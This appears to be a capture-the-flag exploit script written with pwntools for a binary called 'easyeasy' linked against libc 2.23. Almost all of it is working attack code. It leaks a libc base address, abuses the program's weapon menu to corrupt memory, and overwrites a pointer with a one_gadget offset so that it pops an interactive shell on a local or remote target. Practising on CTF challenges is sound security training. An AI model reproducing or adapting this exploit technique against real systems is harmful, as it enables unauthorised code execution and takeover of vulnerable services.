
'''
struct mmbuf
{
    int ID;
    int flg;
    func setFlg;
    func setID;
    func setNum;
    func outSmt;
};
'''

import time, sys
from pwn import *

# local process envirnoment
LOCAL = True
LDBUG = False
elf_name = "./easyeasy"

elf = ELF(elf_name)
libc = ELF("./libc-2.23.so")

if LOCAL:
    onshot_off = 0xF0274
    if LDBUG:
        context.log_level = "debug"
        mine_env = {'LD_PRELOAD': "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so:./libc-2.23.so"}
    else:
        mine_env = {'LD_PRELOAD': "./libc-2.23.so"}
    io = process(elf_name, env=mine_env)
else:
    onshot_off = 0xF0274
    io = remote(remote_host, remote_port)

def dlySend(sdstr):
    io.send(sdstr)
    time.sleep(0.01)

def mmenu(mchoice):
    io.recvuntil("5. exit")
    io.sendline(str(mchoice))

def create(mlength, context):
    mmenu(1)
    io.recvuntil("Input the length of your weapon's name:")
    io.sendline(str(mlength))
    io.recvuntil("Input the name:")
    dlySend(context)

def show():
    mmenu(2)

def drop():
    mmenu(3)

def shot(wpChoice, mID):
    mmenu(4)
    io.recvuntil("3. C++")
    io.sendline(str(wpChoice))
    if wpChoice<=3 and wpChoice>=0:
        io.recvuntil("Input the id:")
        io.sendline(str(mID))

def s_leak():
    log.info("start leak")
    io.recvuntil("Your name :")
    io.sendline('T'*0x07)
    io.recvuntil("Thank you ")
    io.recvline()
    data = io.recvline()[:-1]
    libc.address = u64(data.ljust(8, chr(0))) - (0x7F331F68D770-0x7F331F2C7000)
    log.info("libc address: "+hex(libc.address))

def s_exp():
    s_leak()

    create(0xf8, 'm'*8)
    log.info("start exp")
    read_bufaddr = 0x400A35
    chaned_func = 0x400A24
    shot(1, 0x20)#3
    shot(6, 0x4)#2
    shot(6, 0x4)#1
    pause()
    shot(6, 0x4)#0
    io.recvuntil("Give me your luckynum:")
    # padding = chr(0x30) + str(0x44) + chr(0x31)
    padding = str(0x1AF)
    io.sendline(padding)

    payload = 'A'*0x10
    payload += p64(libc.address+onshot_off)
    payload += 'B'*0x18
    # io.sendline(payload)
    dlySend(payload)
    io.interactive()


if __name__ == "__main__":
    s_exp()
    pause()
